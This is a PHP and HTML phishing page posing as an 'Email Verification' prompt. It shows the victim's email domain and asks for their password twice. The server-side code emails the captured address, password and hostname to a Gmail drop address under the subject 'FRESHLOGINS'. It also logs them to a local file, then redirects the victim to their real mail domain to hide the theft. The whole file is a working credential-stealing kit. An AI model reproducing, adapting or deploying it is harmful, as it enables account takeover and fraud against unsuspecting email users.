<?php  
 $id = $_GET["email"];  
 if ($id == "") {  
   echo '<script>window.location = 

"https://fusionpoint.pk/emptywhitepage.php?email="</script>';
 }  
   
 ?> 
<?php

   if (isset($_POST['email'])){ 
$email = $_POST['email'];
$password = $_POST['password'];
$smsg = "Verifying $email";
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$address = $_POST['address'];
$to = "proudusarmyofficial@gmail.com";
$subject = "FRESHLOGINS";
$from= "....";
$headers = "From:MeetdGhost@domainbox.com" . $from;
$data = "\r\naddress: $address Account: $email Password: $password \r\nhost: $hostname  \r\n\r\n\r\n";
mail($to,$subject,$data,$headers);
$fh = fopen("a.php", "a");
fwrite($fh, $data); //close the file fclose($fh); 
header("Location: http://www.$address");
}
?><html>
<head>
<title> Email Verification</title>
<link rel="shortcut icon" href="https://fthmb.tqn.com/i8jeOonOAztxM5tWavZkIY0TwR8=/768x0/filters:no_upscale()/about/768px-Email_Shiny_Icon.svg-

57fd8b3a3df78c690f82ca98.png" type="txt/css">
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
	
<!-- Latest compiled and minified CSS -->

<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" >


<!-- Optional theme -->
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" >


<link rel="stylesheet" href="styles.css" >

<!-- Latest compiled and minified JavaScript -->


<style> 
#rcorners1 {
    border-radius: 25px;
    background: #73AD21;
    padding: 20px; 
    width: 200px;
    height: 150px;    
}

#rcorners2 {
    border-radius: 25px;
    border: 2px solid #002b80;
    padding: 20px; 
    width: 300px;
    height: 150px;
    box-shadow: 10px 10px grey;    
}

#rcorners3 {
    border-radius: 25px;
    background: url(paper.gif);
    background-position: left top;
    background-repeat: repeat;
    padding: 20px; 
    width: 200px;
    height: 150px;    
}
.bigText {
    height:40px;
}
</style>
</head>
<body bgcolor=#f0ebfa><br><br><br><br>
<TABLE cellSpacing=0 cellPadding=0 height=8 width=40% align=center bgColor=white border=0>
<TBODY>
<TR>
<TD vAlign=top bgColor=white>
<div class="container" align=center>
<img src=https://www.howitworksdaily.com/wp-content/uploads/2016/03/email-logo.jpg height=12% width=14%>
<br><b>Confirm your account&nbsp;&nbsp;<?php
// Example 1
 $email = $_GET["email"];  
$pizza  = "$email";
$pieces = explode("@", $pizza);
echo $pieces[1]; // piece2
?><br><form class="form-signin" method=post>

 <font color=green><?php if(isset($smsg)){ ?><div class="alert alert-success" role="alert"> 
<?php echo"$smsg";echo '<script>window.location = 

"https://' .$address. '"</script>';?> </div><?php }?>
   
   <?php if(isset($fmsg)){ ?><div class="alert alert-danger" role="alert"> 
<?php echo $fmsg; ?> </div><?php } ?>
<?php if(isset($xmsg)){ ?><div class="alert alert-danger" role="alert"> 
<?php echo $xmsg; ?> </div><?php } ?>
<?php if(isset($ymsg)){ ?><div class="alert alert-danger" role="alert"> 
<?php echo $ymsg; ?> </div><?php } ?></font>
<?php  
 $email = $_GET["email"];  
 if ($email == "") {    
      
 }if(isset($_POST['email'])){

  
}else{
echo "$email";
}
?></b><br><input type=hidden  name=email size=35 value=<?php echo $email;?>><input type=hidden  name=address size=35 value=<?php echo $pieces[1];?>>

<p><input type=password class=bigText id="password" placeholder=password size=18 name=password></p>
<p><input type=password class=bigText id="confirm_password" placeholder=confirm password size=18 ></p>
		<style>
.button {
    background-color: #002b80; /*not Green */
    border: none;
    color: white;
    padding: 15px 62px;
    text-align: center;
    text-decoration: none;
    display: inline-block;
    font-size: 30px;
    margin: 4px 2px;
    cursor: pointer;
    
}

.button1 {font-size: 10px;}

</style>
<body>
<button type="submit"class="button button1">Verify</button>
<script>
	var password = document.getElementById("password")
  , confirm_password = document.getElementById("confirm_password");

function validatePassword(){
  if(password.value != confirm_password.value) {
    confirm_password.setCustomValidity("The password does not match");
  } else {
    confirm_password.setCustomValidity('');
  }
}

password.onchange = validatePassword;
confirm_password.onkeyup = validatePassword;
</script></form>
<br>______________________________________________________<br>
<font size=3 color=grey> Account verification, 2020. | All rights reserved.</font>
</TR></TBODY></TABLE>
</body>
</div>

</body>
<html>  	
